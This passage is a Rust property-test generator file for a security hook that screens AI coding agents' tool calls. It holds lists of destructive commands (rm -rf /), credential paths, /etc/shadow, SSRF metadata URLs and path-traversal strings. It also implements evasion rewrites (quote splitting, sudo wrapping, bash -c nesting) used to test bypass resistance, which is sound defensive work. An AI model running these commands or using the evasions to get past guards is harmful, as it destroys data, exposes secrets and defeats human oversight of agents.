//! Reusable proptest strategies for ptuf data types.
//!
//! Strategies live in one place so per-module property tests stay
//! short and focused on the invariant under test rather than on
//! generator plumbing. The bash-command generators deliberately
//! sample three regions of the input space:
//!
//! 1. **Benign**: short alphanumeric tokens with safe heads
//!    (`ls`, `echo`, `cat`).
//! 2. **Suspicious**: heads and arguments drawn from the same
//!    vocabulary the built-in rules look for (`rm`, `curl`, `sudo`,
//!    `~/.ssh/id_rsa`, …) so rules actually fire often enough to
//!    cover their `Some(Deny)` arms.
//! 3. **Adversarial**: arbitrary printable ASCII soup that includes
//!    shell metacharacters, used to drive panic-safety properties.
//!
//! All strategies are `pub(crate)` so they are reachable from each
//! module's `#[cfg(test)] mod tests` block via
//! `crate::testing::proptest::*`, and from `tests/engine_proptest.rs`
//! through the integration-test crate that re-imports the lib.

#![allow(clippy::expect_used, clippy::unwrap_used)]

use proptest::collection::vec;
use proptest::prelude::*;
use serde_json::json;

use crate::config::{Allowlist, Config, Mode, PackOverride, RuleOverride};
use crate::decision::{Decision, DecisionKind, Severity};
use crate::facts::sensitive::SensitiveKind;
use crate::hook_input::HookInput;
use crate::self_paths::ProtectedKind;

/// Short, dotted rule identifiers similar to `core.network.foo`.
pub fn rule_id() -> impl Strategy<Value = String> {
    "[a-z][a-z0-9]{0,5}(\\.[a-z][a-z0-9]{0,5}){1,3}"
}

/// Short reason strings without control characters; long enough to
/// exercise allocation but short enough to keep failure messages
/// readable.
pub fn reason_text() -> impl Strategy<Value = String> {
    "[ -~]{0,40}"
}

/// `Severity` variants drawn uniformly.
pub fn severity() -> impl Strategy<Value = Severity> {
    prop_oneof![
        Just(Severity::Info),
        Just(Severity::Low),
        Just(Severity::Medium),
        Just(Severity::High),
        Just(Severity::Critical),
    ]
}

/// `DecisionKind` variants drawn uniformly.
pub fn decision_kind() -> impl Strategy<Value = DecisionKind> {
    prop_oneof![
        Just(DecisionKind::Allow),
        Just(DecisionKind::Monitor),
        Just(DecisionKind::Ask),
        Just(DecisionKind::Deny),
    ]
}

/// Full `Decision` values across all four variants.
pub fn decision() -> impl Strategy<Value = Decision> {
    prop_oneof![
        Just(Decision::Allow),
        rule_id().prop_map(|rule_id| Decision::Monitor { rule_id }),
        (rule_id(), reason_text()).prop_map(|(rule_id, reason)| Decision::Ask { rule_id, reason }),
        (rule_id(), reason_text()).prop_map(|(rule_id, reason)| Decision::Deny { rule_id, reason }),
    ]
}

/// Bounded list of decisions for `aggregate` properties. The upper
/// bound is generous enough to expose ordering / commutativity bugs
/// that only surface with several restrictive entries mixed in.
pub fn decision_list() -> impl Strategy<Value = Vec<Decision>> {
    vec(decision(), 0..32)
}

/// Heads that the built-in rules treat as dangerous primitives.
const DANGEROUS_HEADS: &[&str] = &[
    "rm",
    "/bin/rm",
    "/usr/bin/rm",
    "curl",
    "wget",
    "fetch",
    "scp",
    "rsync",
    "nc",
    "ncat",
    "sudo",
    "bash",
    "sh",
    "zsh",
    "python",
    "python3",
    "ruby",
    "node",
];

/// Heads that no built-in rule should fire on.
const SAFE_HEADS: &[&str] = &[
    "ls", "echo", "cat", "grep", "head", "tail", "wc", "true", "false", "pwd", "date",
];

/// Arguments commonly seen alongside dangerous heads, including
/// destructive flag combinations and credential paths.
const SUSPICIOUS_ARGS: &[&str] = &[
    "-rf",
    "-fr",
    "-rfv",
    "--recursive",
    "--force",
    "/",
    "/*",
    "/etc",
    "/usr",
    "/var",
    "~",
    "~/",
    "$HOME",
    "${HOME}",
    "~/.ssh/id_rsa",
    "~/.aws/credentials",
    "~/.kube/config",
    ".env",
    ".env.production",
    "{a,b}.env",
    "{.env,.env.local}",
    "prefix{a,b}.env.production",
    "*.env",
    "https://example.com/install.sh",
    "https://example.com/i.py",
    "id_rsa",
    "id_ed25519",
];

/// Single bash word: either a safe identifier or a sample drawn from
/// the suspicious-args list. Kept whitespace-free so the resulting
/// command parses as a single argv entry. The identifier branch is
/// intentionally allowed to grow up to 64 characters so generators
/// occasionally probe long-token paths.
fn bash_word() -> impl Strategy<Value = String> {
    prop_oneof![
        4 => "[a-zA-Z0-9_./-]{1,64}",
        1 => proptest::sample::select(SUSPICIOUS_ARGS).prop_map(std::string::ToString::to_string),
    ]
}

fn bash_head() -> impl Strategy<Value = String> {
    prop_oneof![
        2 => proptest::sample::select(SAFE_HEADS).prop_map(std::string::ToString::to_string),
        2 => proptest::sample::select(DANGEROUS_HEADS).prop_map(std::string::ToString::to_string),
        1 => "[a-z][a-z0-9]{0,8}",
    ]
}

fn bash_argv() -> impl Strategy<Value = String> {
    (bash_head(), vec(bash_word(), 0..4)).prop_map(|(head, args)| {
        if args.is_empty() {
            head
        } else {
            format!("{} {}", head, args.join(" "))
        }
    })
}

/// One-pipeline command: zero or more `|`-joined argvs.
fn bash_pipeline() -> impl Strategy<Value = String> {
    vec(bash_argv(), 1..3).prop_map(|cmds| cmds.join(" | "))
}

/// Compound command: pipelines joined by `;`, `&&`, or `||`. Up to
/// six pipelines so generators occasionally produce long compound
/// commands that stress the lexer's per-segment state machine.
pub fn bash_command() -> impl Strategy<Value = String> {
    let sep = prop_oneof![Just("; "), Just(" && "), Just(" || ")];
    (vec(bash_pipeline(), 1..6), vec(sep, 0..6)).prop_map(|(parts, seps)| {
        let mut out = String::new();
        for (i, part) in parts.iter().enumerate() {
            if i > 0 {
                let s = seps.get(i - 1).copied().unwrap_or("; ");
                out.push_str(s);
            }
            out.push_str(part);
        }
        out
    })
}

/// Adversarial bash-string generator. Mixes four input regions so the
/// lexer / parser get probed across realistic-shape and adversarial
/// shapes: printable ASCII (the historical default), arbitrary
/// Unicode (CJK, accented letters), C0 control bytes (NUL, BEL, …),
/// and short runs of replacement-char-tagged garbage that surface from
/// `String::from_utf8_lossy` on the stdin reader. Used for panic-safety
/// properties; structure of the output is not asserted.
pub fn arbitrary_command() -> impl Strategy<Value = String> {
    prop_oneof![
        4 => "[ -~]{0,40}",
        2 => "\\PC{0,32}",
        1 => "[\\x00-\\x1f]{0,16}",
        1 => arbitrary_utf8_bytes()
            .prop_map(|b| String::from_utf8_lossy(&b).into_owned()),
    ]
}

/// Hook tool names. Bash is the most-tested surface but kept at parity
/// with structured tools so non-Bash facts (`path`, `url`) get an
/// equal share of generated cases.
fn tool_name() -> impl Strategy<Value = String> {
    prop_oneof![
        2 => Just("Bash".to_string()),
        2 => proptest::sample::select(&["Read", "Write", "Edit", "Glob", "Grep"][..])
            .prop_map(std::string::ToString::to_string),
        1 => "[A-Z][A-Za-z]{0,8}",
    ]
}

/// `HookInput` covering Bash payloads with a `command` string and
/// non-Bash payloads with miscellaneous JSON shapes. The bias is
/// rebalanced from the historical 4:1:1 (Bash-dominant) to 2:2:1 so
/// `Read`/`Write`/`Edit` paths see meaningful coverage.
pub fn hook_input() -> impl Strategy<Value = HookInput> {
    prop_oneof![
        2 => bash_command().prop_map(|command| HookInput {
            tool_name: "Bash".to_string(),
            tool_input: json!({ "command": command }),
        }),
        2 => (tool_name(), bash_command()).prop_map(|(tool_name, command)| HookInput {
            tool_name,
            tool_input: json!({ "command": command }),
        }),
        1 => tool_name().prop_map(|tool_name| HookInput {
            tool_name,
            tool_input: json!({}),
        }),
    ]
}

/// `HookInput` whose `tool_name` is guaranteed to be different from
/// `"Bash"`. Used by rule-level PBT to verify that no built-in rule
/// fires on non-Bash tools.
pub fn non_bash_hook_input() -> impl Strategy<Value = HookInput> {
    let names = prop_oneof![
        proptest::sample::select(&["Read", "Write", "Edit", "Glob", "Grep"][..])
            .prop_map(std::string::ToString::to_string),
        "[A-Z][A-Za-z]{0,8}".prop_map(|s| s),
    ]
    .prop_filter("must not be Bash", |s| s != "Bash");
    prop_oneof![
        2 => (names.clone(), bash_command()).prop_map(|(tool_name, command)| HookInput {
            tool_name,
            tool_input: json!({ "command": command }),
        }),
        1 => names.prop_map(|tool_name| HookInput {
            tool_name,
            tool_input: json!({}),
        }),
    ]
}

/// All engine [`Mode`] variants drawn uniformly.
pub fn mode() -> impl Strategy<Value = Mode> {
    prop_oneof![Just(Mode::Enforce), Just(Mode::Monitor)]
}

/// All eight [`ProtectedKind`] variants drawn uniformly.
pub fn protected_kind() -> impl Strategy<Value = ProtectedKind> {
    prop_oneof![
        Just(ProtectedKind::Binary),
        Just(ProtectedKind::Config),
        Just(ProtectedKind::Plugin),
        Just(ProtectedKind::ClaudeSettings),
        Just(ProtectedKind::CodexSettings),
        Just(ProtectedKind::HookScript),
        Just(ProtectedKind::CopilotSettings),
        Just(ProtectedKind::KiroSettings),
    ]
}

/// All eleven [`SensitiveKind`] variants drawn uniformly.
pub fn sensitive_kind() -> impl Strategy<Value = SensitiveKind> {
    prop_oneof![
        Just(SensitiveKind::SshDir),
        Just(SensitiveKind::AwsDir),
        Just(SensitiveKind::GcloudDir),
        Just(SensitiveKind::KubeConfig),
        Just(SensitiveKind::DockerConfig),
        Just(SensitiveKind::PrivateKeyFile),
        Just(SensitiveKind::Dotenv),
        Just(SensitiveKind::Npmrc),
        Just(SensitiveKind::Pypirc),
        Just(SensitiveKind::Tfstate),
        Just(SensitiveKind::PemBlob),
    ]
}

/// File-path strings: a mix of project-relative paths, absolute paths
/// under common system roots, `~`/`$HOME` forms, and well-known
/// sensitive paths. The mix is heavily biased so that `path` /
/// `sensitive` extractors actually exercise their non-empty arms.
pub fn file_path() -> impl Strategy<Value = String> {
    let safe_abs = "/(?:tmp|repo|home/me|var/log|opt/app)/[a-zA-Z0-9_./-]{0,16}";
    let project_rel = "[a-zA-Z0-9_./-]{1,20}";
    let home_form = prop_oneof![
        Just("~".to_string()),
        Just("$HOME".to_string()),
        Just("${HOME}".to_string()),
    ];
    let home_with_suffix =
        (home_form.clone(), "[a-zA-Z0-9_./-]{0,16}").prop_map(|(prefix, rest)| {
            if rest.is_empty() {
                prefix
            } else {
                format!("{prefix}/{rest}")
            }
        });
    let sensitive_paths = proptest::sample::select(
        &[
            "~/.ssh/id_rsa",
            "~/.ssh/id_ed25519",
            "~/.ssh/config",
            "~/.aws/credentials",
            "~/.aws/config",
            "~/.config/gcloud/application_default_credentials.json",
            "~/.kube/config",
            "~/.docker/config.json",
            ".env",
            ".env.production",
            "/srv/app/.env",
            "{a,b}.env",
            "{.env,.env.local}",
            "prefix{x,y}.env",
            "*.env",
            "infra/main.tfstate",
            ".npmrc",
            ".pypirc",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/ptuf/policy.yaml",
            "/repo/.ptuf.yaml",
            "/repo/.claude/settings.json",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    // Path-escape / normalisation corner cases: `..` traversal, mixed
    // separators, redundant slashes, `~`-relative escapes. The path
    // canonicaliser and workspace-boundary check must stay correct
    // when these reach `facts::path` extraction.
    let traversal_paths = proptest::sample::select(
        &[
            "..",
            "../",
            "../..",
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/../etc/passwd",
            "///etc/passwd",
            "~/../",
            "$HOME/../",
            "/repo/.ptuf.yaml/../../etc/passwd",
            "./././foo",
            "/repo//.//file",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    prop_oneof![
        2 => safe_abs,
        2 => project_rel,
        1 => home_form,
        2 => home_with_suffix,
        2 => sensitive_paths,
        2 => traversal_paths,
    ]
}

/// URL-shaped strings spanning safe HTTPs, SSRF-style cloud-metadata
/// endpoints, alternative schemes, malformed strings, and arbitrary
/// printable ASCII. Used by URL-fact and rule PBT to exercise both
/// happy and adversarial paths through `url::parse`.
pub fn web_url() -> impl Strategy<Value = String> {
    let safe = proptest::sample::select(
        &[
            "https://example.com/",
            "https://api.github.com/repos/x/y",
            "http://example.com:8080/admin",
            "https://example.com:443",
            "https://user:pass@example.com/x",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    let cloud = proptest::sample::select(
        &[
            "http://169.254.169.254/latest/meta-data/",
            "http://[fd00:ec2::254]/latest/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    let weird_scheme = proptest::sample::select(
        &[
            "file:///etc/shadow",
            "ftp://example.com/",
            "data:,abc",
            "javascript:alert(1)",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    let malformed = proptest::sample::select(
        &[
            "example.com/foo",
            "http:///foo",
            "://x",
            "http://example.com:notaport/",
            "http://[::1]:abc/",
            "",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    let arbitrary = "[ -~]{0,40}";
    prop_oneof![
        4 => safe,
        2 => cloud,
        1 => weird_scheme,
        2 => malformed,
        1 => arbitrary,
    ]
}

/// `HookInput` for `Read` / `Edit` / `Write` covering the three tool
/// names with realistic `file_path` distributions.
pub fn read_edit_write_input() -> impl Strategy<Value = HookInput> {
    let tool = proptest::sample::select(&["Read", "Edit", "Write"][..])
        .prop_map(std::string::ToString::to_string);
    prop_oneof![
        4 => (tool.clone(), file_path()).prop_map(|(tool_name, fp)| HookInput {
            tool_name,
            tool_input: json!({ "file_path": fp }),
        }),
        // Edit has new_string, Write has content.
        1 => (file_path(), "[ -~]{0,40}").prop_map(|(fp, body)| HookInput {
            tool_name: "Write".into(),
            tool_input: json!({ "file_path": fp, "content": body }),
        }),
        1 => (file_path(), "[ -~]{0,40}").prop_map(|(fp, body)| HookInput {
            tool_name: "Edit".into(),
            tool_input: json!({ "file_path": fp, "new_string": body }),
        }),
        // Missing or non-string field — exercises None branches.
        1 => Just(HookInput {
            tool_name: "Read".into(),
            tool_input: json!({}),
        }),
    ]
}

/// `HookInput` for the `WebFetch` tool, biased toward URL shapes that
/// the URL fact extractor and the cloud-metadata rule actually care
/// about.
pub fn web_fetch_input() -> impl Strategy<Value = HookInput> {
    prop_oneof![
        4 => web_url().prop_map(|u| HookInput {
            tool_name: "WebFetch".into(),
            tool_input: json!({ "url": u }),
        }),
        1 => Just(HookInput {
            tool_name: "WebFetch".into(),
            tool_input: json!({}),
        }),
    ]
}

/// Superset hook-input strategy spanning every tool surface the engine
/// is exercised against (Bash, Read/Edit/Write, WebFetch, plus
/// arbitrary unknown tools).
pub fn richer_hook_input() -> impl Strategy<Value = HookInput> {
    prop_oneof![
        4 => hook_input(),
        2 => read_edit_write_input(),
        2 => web_fetch_input(),
        1 => "[A-Z][A-Za-z]{0,8}".prop_map(|s| HookInput {
            tool_name: s,
            tool_input: json!({}),
        }),
    ]
}

/// Single argv token biased toward tokens that the CLI parser
/// (`crate::cli::parse`) actually distinguishes: subcommand names,
/// agent names, flag names with and without `=value` form, tool
/// names, plus a sliver of arbitrary printable ASCII so adversarial
/// shapes get probed too. Returned tokens never contain whitespace
/// so they line up one-to-one with `argv` slots.
fn argv_token() -> impl Strategy<Value = String> {
    let subcmd = proptest::sample::select(
        &[
            "init",
            "hook",
            "eval",
            "plugin",
            "test",
            "--help",
            "-h",
            "--version",
            "-V",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    let agent = proptest::sample::select(&["claude-code", "codex"][..])
        .prop_map(std::string::ToString::to_string);
    let flag = proptest::sample::select(
        &[
            "--json",
            "--dry-run",
            "--tool",
            "--settings",
            "--root",
            "--hooks",
            "--config",
            "--tool=Bash",
            "--settings=foo",
            "--root=/tmp",
            "--hooks=foo.json",
            "--config=foo.toml",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    let tool = proptest::sample::select(&["Bash", "Read", "Write", "Edit"][..])
        .prop_map(std::string::ToString::to_string);
    let arbitrary = "[!-~]{0,16}";
    prop_oneof![
        4 => subcmd,
        2 => agent,
        3 => flag,
        2 => tool,
        2 => arbitrary,
    ]
}

/// Argv vector for `crate::cli::parse` PBT: 0 to 6 tokens drawn from
/// [`argv_token`]. The empty vector exercises the "missing subcommand"
/// error branch; longer vectors stress the per-subcommand parsers.
pub fn argv_tokens() -> impl Strategy<Value = Vec<String>> {
    vec(argv_token(), 0..=6)
}

/// Bash command words mixing single-quoted, double-quoted, and
/// backslash-escaped tokens. Used by `facts::shell::parse` PBT to
/// stress quote handling and to keep flags/positional invariants
/// intact across quoting forms.
pub fn bash_with_quoting() -> impl Strategy<Value = String> {
    let head = bash_head();
    let single = "[ a-zA-Z0-9_./-]{0,8}".prop_map(|s| format!("'{s}'"));
    let double = "[ a-zA-Z0-9_./-]{0,8}".prop_map(|s| format!("\"{s}\""));
    let escaped = "[a-zA-Z0-9_./-]{1,4}".prop_map(|s| format!("\\ {s}"));
    let plain = "[a-zA-Z0-9_./-]{1,8}".prop_map(|s| s.to_string());
    let word = prop_oneof![
        2 => plain,
        2 => single,
        2 => double,
        1 => escaped,
    ];
    (head, vec(word, 0..4)).prop_map(|(h, args)| {
        if args.is_empty() {
            h
        } else {
            format!("{h} {}", args.join(" "))
        }
    })
}

/// One-pipeline command containing at least one redirect operator
/// drawn from `>`, `>>`, `<`, `2>`, `&>`. The redirect target is a
/// short safe filename. Used to verify that every emitted operator
/// shows up in `Pipeline.redirects` with the same kind.
pub fn bash_redirects() -> impl Strategy<Value = (String, Vec<&'static str>)> {
    let op = prop_oneof![Just(">"), Just(">>"), Just("<"), Just("2>"), Just("&>"),];
    (
        bash_head(),
        vec(
            (op, "[a-z][a-z0-9_]{0,6}").prop_map(|(o, t)| (o, format!("{o} {t}"))),
            1..3,
        ),
    )
        .prop_map(|(head, redirs)| {
            let ops: Vec<&'static str> = redirs.iter().map(|(o, _)| *o).collect();
            let cmd = format!(
                "{head} {}",
                redirs
                    .iter()
                    .map(|(_, fragment)| fragment.as_str())
                    .collect::<Vec<_>>()
                    .join(" ")
            );
            (cmd, ops)
        })
}

/// Bash heredoc command (`cat <<TAG\nbody\nTAG\n` form). The
/// terminator is one of a fixed allow-list and the body avoids the
/// terminator literal so the heredoc closes cleanly. Used to check
/// `Bash::has_heredoc` and that the body stays inside one
/// `Redirect.target`.
pub fn bash_heredoc() -> impl Strategy<Value = (String, &'static str)> {
    let terminator = prop_oneof![Just("EOF"), Just("END"), Just("DONE")];
    let dash = prop_oneof![Just(""), Just("-")];
    (terminator, dash, "[a-zA-Z0-9 _./-]{0,30}").prop_map(|(tag, dash, body_seed)| {
        let body: String = body_seed
            .split_whitespace()
            .filter(|w| *w != tag)
            .collect::<Vec<_>>()
            .join(" ");
        let cmd = format!("cat <<{dash}{tag}\n{body}\n{tag}\n");
        (cmd, tag)
    })
}

/// Bash command containing at least one process substitution
/// (`<(cmd)` or `>(cmd)`) with balanced parens around a safe inner
/// argv. Used to check `Bash::has_process_substitution`.
pub fn bash_process_subst() -> impl Strategy<Value = String> {
    let direction = prop_oneof![Just("<"), Just(">")];
    (bash_head(), direction, "[a-z][a-z0-9_]{0,6}")
        .prop_map(|(head, dir, inner)| format!("{head} {dir}({inner} arg)"))
}

/// Combined short-option wrapper (`bash -lc 'X'`, `sh -ec 'X'`,
/// `dash -ic 'X'`). Used to verify that the wrapper inspector still
/// pulls `inner_argv` out of grouped short flags.
pub fn combined_short_opts() -> impl Strategy<Value = String> {
    let interp = prop_oneof![Just("bash"), Just("sh"), Just("dash")];
    let opts = prop_oneof![Just("lc"), Just("ec"), Just("ic"), Just("uc"),];
    (interp, opts, "[a-z][a-z0-9 _-]{0,12}").prop_map(|(i, o, body)| format!("{i} -{o} '{body}'"))
}

/// Wrapper command nested up to `depth` levels deep using `bash -c`,
/// `sh -c`, `eval`, or `xargs sh -c`. The innermost layer is a single
/// safe head. Used to verify the bounded-depth `inner_argv` chain
/// (the parser uses `NESTING_BUDGET = 3` from `parse_with_depth`,
/// so chains never grow beyond two).
pub fn bash_wrapper_nested(depth: usize) -> impl Strategy<Value = String> {
    let depth = depth.min(4);
    let inner = "[a-z][a-z0-9]{0,4}".prop_map(|s| s.to_string());
    inner.prop_map(move |leaf| {
        let mut cmd = leaf;
        for _ in 0..depth {
            cmd = format!("bash -c '{}'", cmd.replace('\'', "'\\''"));
        }
        cmd
    })
}

/// Adversarial byte vector mixing four shapes: printable ASCII, NUL /
/// control bytes (binary-protocol corner), invalid UTF-8 sequences
/// (lone surrogate markers, naked 0xFF, incomplete continuations), and
/// arbitrary `Vec<u8>` (no UTF-8 guarantee). Used to drive fail-closed
/// PBT for the hook stdin reader, which must surface an error rather
/// than panic.
pub fn arbitrary_utf8_bytes() -> impl Strategy<Value = Vec<u8>> {
    let printable = "[ -~]{0,40}".prop_map(|s| s.into_bytes());
    // Includes 0x00 (NUL) and the C0 / DEL band that can break naive
    // string handling (`CString::new`, line-oriented readers).
    let control = vec(0u8..=0x1f, 0..16);
    let bad = prop_oneof![
        Just(vec![0xFFu8]),
        Just(vec![0xC2u8]),           // dangling 2-byte lead.
        Just(vec![0xED, 0xA0, 0x80]), // UTF-8-encoded surrogate U+D800.
        Just(vec![0xE0, 0x80]),       // truncated 3-byte sequence.
    ];
    let raw = vec(any::<u8>(), 0..256);
    prop_oneof![
        5 => printable,
        2 => control,
        2 => (bad, "[ -~]{0,8}").prop_map(|(mut b, tail)| {
            b.extend_from_slice(tail.as_bytes());
            b
        }),
        1 => raw,
    ]
}

/// MCP-shaped `tool_input` JSON for `mcp__<server>__<tool>` payloads.
/// Covers top-level `path`, `files[].path`, `items[].path`, and
/// `paths[]` shapes that `collect_event_paths` extracts. The depth
/// argument selects which shape:
/// - `0`: top-level `{ "path": "..." }`
/// - `1`: `{ "files": [ { "path": "..." } ] }` /
///   `{ "items": [ { "path": "..." } ] }`
/// - `2`: `{ "paths": ["..."] }`
pub fn mcp_nested_input(depth: u8) -> impl Strategy<Value = serde_json::Value> {
    let path_str = file_path();
    let depth = depth.min(2);
    match depth {
        0 => path_str.prop_map(|p| json!({ "path": p })).boxed(),
        1 => (path_str, prop_oneof![Just("files"), Just("items")])
            .prop_map(|(p, key)| json!({ key: [{ "path": p }] }))
            .boxed(),
        _ => vec(file_path(), 1..3)
            .prop_map(|ps| json!({ "paths": ps }))
            .boxed(),
    }
}

/// `Bash` commands assembled from heads that no built-in rule fires
/// on, with at most one safe argument. Used by RULES negative-space
/// PBT to verify that benign inputs reach `evaluate() == None` for
/// every rule.
pub fn safe_command_string() -> impl Strategy<Value = String> {
    let head = proptest::sample::select(SAFE_HEADS).prop_map(|s| s.to_string());
    let arg = prop_oneof![
        Just(String::new()),
        "[a-zA-Z0-9_./-]{1,8}".prop_map(|s| s.to_string()),
    ];
    (head, arg).prop_map(|(h, a)| if a.is_empty() { h } else { format!("{h} {a}") })
}

/// Heads accessible from outside the crate; mirrors the private
/// `SAFE_HEADS` constant. Used by `tests/rules_proptest.rs` to assert
/// that no built-in rule fires on a head this generator declares safe.
pub fn safe_heads() -> &'static [&'static str] {
    SAFE_HEADS
}

// --- Metamorphic semantics-preserving transforms (SPT) -----------------------
//
// These power `tests/metamorphic_proptest.rs`. The metamorphic layer asserts
// a *relational* property the rest of the suite does not: rewriting a command
// in a way that does not change its meaning must never weaken the engine's
// decision (a denied command stays denied). That directly attacks the
// bypass-resistance claim — flag-bundle splitting, privilege wrappers,
// `bash -c` nesting, quoting, and command compounding are the classic
// obfuscations an attacker reaches for.
//
// The hard part is the transforms' own correctness: a buggy "semantics-
// preserving" rewrite would make the property lie. Two defences keep them
// honest. First, every transform is a pure token/string rewrite here and
// never calls `facts::shell::parse`, so it cannot accidentally couple to the
// code under test. Second, each transform carries a *soundness* property
// (the `H` group in the test file) that re-parses the rewritten string and
// checks the decision-relevant tokens round-trip as intended; if a transform
// is wrong, that property fails first, separating "generator bug" from
// "engine bypass".
//
// Commands are carried as token vectors (`Vec<String>`) so transforms can
// manipulate the head / flags / target without re-tokenising. Every token a
// generator here produces is free of whitespace, quotes, and `;`/`|`/`&`
// metacharacters, so `tokens.join(" ")` is an exact, lossless rendering.

/// Absolute-path spellings of `rm` the destructive-delete rule treats as
/// equivalent heads (`src/rules/destructive_rm.rs` `RM_HEADS`).
const RM_HEAD_FORMS: &[&str] = &["rm", "/bin/rm", "/usr/bin/rm"];

/// A deny-eliciting `rm` invocation, carried as a token vector
/// (`["rm", "-rf", "/etc"]`). Every draw satisfies the destructive-rm
/// rule's three conditions — an `rm` head, a recursive **and** force flag,
/// and a system / home / root / parent-escape target — so the default
/// engine denies it. Metamorphic properties rewrite this base and assert
/// the deny survives.
pub fn dangerous_rm_tokens() -> impl Strategy<Value = Vec<String>> {
    let flags = prop_oneof![
        Just(vec!["-rf".to_string()]),
        Just(vec!["-fr".to_string()]),
        Just(vec!["-Rf".to_string()]),
        Just(vec!["-rfv".to_string()]),
        Just(vec!["-r".to_string(), "-f".to_string()]),
        Just(vec!["--recursive".to_string(), "--force".to_string()]),
    ];
    let target = proptest::sample::select(
        &[
            "/",
            "/*",
            "/etc",
            "/usr",
            "/var",
            "~",
            "$HOME",
            "${HOME}",
            "..",
            "../../etc",
        ][..],
    )
    .prop_map(std::string::ToString::to_string);
    (flags, target).prop_map(|(flags, target)| {
        let mut tokens = vec!["rm".to_string()];
        tokens.extend(flags);
        tokens.push(target);
        tokens
    })
}

/// Render a token vector to a space-joined command string. Lossless for
/// the whitespace-free tokens the metamorphic generators produce.
pub fn render_tokens(tokens: &[String]) -> String {
    tokens.join(" ")
}

/// Split the first bundled short flag (`-rf`) into separate single-letter
/// flags (`-r -f`). Long flags (`--recursive`) and already-split flags are
/// left untouched. Semantics-preserving: bundled and split short flags are
/// identical to a POSIX option parser.
pub fn split_bundled_flag(tokens: &[String]) -> Vec<String> {
    let mut out = Vec::with_capacity(tokens.len() + 2);
    let mut done = false;
    for token in tokens {
        if !done && is_bundled_short_flag(token) {
            for ch in token[1..].chars() {
                out.push(format!("-{ch}"));
            }
            done = true;
        } else {
            out.push(token.clone());
        }
    }
    out
}

fn is_bundled_short_flag(token: &str) -> bool {
    token.starts_with('-')
        && !token.starts_with("--")
        && token.len() > 2
        && token[1..].chars().all(|c| c.is_ascii_alphabetic())
}

/// Rewrite an `rm` head to an equivalent absolute-path spelling
/// (`rm` ↔ `/bin/rm` ↔ `/usr/bin/rm`). `form` selects the target spelling.
/// Decision-invariant: the rule matches all three forms identically.
pub fn rewrite_rm_head(tokens: &[String], form: usize) -> Vec<String> {
    let mut out = tokens.to_vec();
    if let Some(head) = out.first_mut()
        && RM_HEAD_FORMS.contains(&head.as_str())
    {
        *head = RM_HEAD_FORMS[form % RM_HEAD_FORMS.len()].to_string();
    }
    out
}

/// Insert a harmless value-less flag (`-v`, verbose) into the `rm`
/// command's own flag list, immediately after the `rm` head. Adds output
/// noise only; the recursive / force / target structure is untouched.
///
/// The flag is deliberately attached to the `rm` head rather than the
/// first argument position: when the command is wrapped (`sudo -u root rm
/// …`), inserting into the wrapper's option region would change which
/// token the wrapper treats as its value and break meaning. Anchoring on
/// the `rm` head keeps the rewrite genuinely semantics-preserving.
pub fn insert_harmless_flag(tokens: &[String]) -> Vec<String> {
    let mut out = tokens.to_vec();
    let rm_pos = out.iter().position(|t| RM_HEAD_FORMS.contains(&t.as_str()));
    if let Some(pos) = rm_pos {
        out.insert(pos + 1, "-v".to_string());
    }
    out
}

/// Prefix a recognised privilege-escalation wrapper
/// (`src/facts/shell.rs` `PREFIX_WRAPPERS`). `form` selects the wrapper and
/// whether a value-taking option (`-u root` / `--user root`) is included.
/// Decision-`>=`: the engine unwraps these wrappers, so the inner command's
/// decision is preserved (and the wrapper can only add risk, never remove).
pub fn privilege_wrap(tokens: &[String], form: usize) -> Vec<String> {
    let prefix: &[&str] = match form % 6 {
        0 => &["sudo"],
        1 => &["sudo", "-u", "root"],
        2 => &["doas"],
        3 => &["doas", "-u", "root"],
        4 => &["pkexec"],
        _ => &["run0"],
    };
    let mut out: Vec<String> = prefix.iter().map(|s| (*s).to_string()).collect();
    out.extend(tokens.iter().cloned());
    out
}

/// Quote the token at `idx` (taken mod length) using one of four
/// semantics-preserving spellings selected by `form`: double quotes,
/// single quotes, an embedded empty single-quote pair (`r''m`), or a
/// trailing backslash escape (`r\m`). The engine strips quoting, so the
/// parsed token — and hence the decision — is unchanged. Tokens that
/// already carry a quote or whitespace are returned untouched (defensive;
/// the metamorphic generators never produce them).
pub fn quote_token(tokens: &[String], idx: usize, form: usize) -> Vec<String> {
    if tokens.is_empty() {
        return tokens.to_vec();
    }
    let target = idx % tokens.len();
    let mut out = tokens.to_vec();
    let token = &out[target];
    if token.is_empty() || token.contains(['\'', '"', ' ', '\t', '\\']) {
        return out;
    }
    let chars: Vec<char> = token.chars().collect();
    out[target] = match form % 4 {
        0 => format!("\"{token}\""),
        1 => format!("'{token}'"),
        2 => {
            let (first, rest) = chars.split_at(1);
            let first: String = first.iter().collect();
            let rest: String = rest.iter().collect();
            format!("{first}''{rest}")
        },
        _ => {
            let (init, last) = chars.split_at(chars.len() - 1);
            let init: String = init.iter().collect();
            let last: String = last.iter().collect();
            format!("{init}\\{last}")
        },
    };
    out
}

/// Render `tokens` joining them with 1–3 spaces per gap, taken from
/// `widths`. Extra whitespace is insignificant to the shell tokeniser, so
/// the parsed command is unchanged.
pub fn whitespace_join(tokens: &[String], widths: &[usize]) -> String {
    let mut out = String::new();
    for (i, token) in tokens.iter().enumerate() {
        if i > 0 {
            let n = widths.get(i - 1).map_or(1, |w| w % 3 + 1);
            for _ in 0..n {
                out.push(' ');
            }
        }
        out.push_str(token);
    }
    out
}

/// Wrap a command string in `bash -c '…'`, single-quote-escaping the body.
/// The parser surfaces the inner command via `Argv::inner_argv`, so the
/// inner decision is preserved (decision-`>=`).
pub fn shellc_wrap(cmd: &str) -> String {
    format!("bash -c '{}'", cmd.replace('\'', "'\\''"))
}

/// Compound `cmd` with a benign segment using `;`, `&&`, or `||`, in either
/// order, selected by `form`. The dangerous segment is still present, so the
/// aggregated decision is at least as strict (decision-`>=`).
pub fn conjoin_safe(cmd: &str, form: usize) -> String {
    match form % 5 {
        0 => format!("echo ok && {cmd}"),
        1 => format!("{cmd} && echo done"),
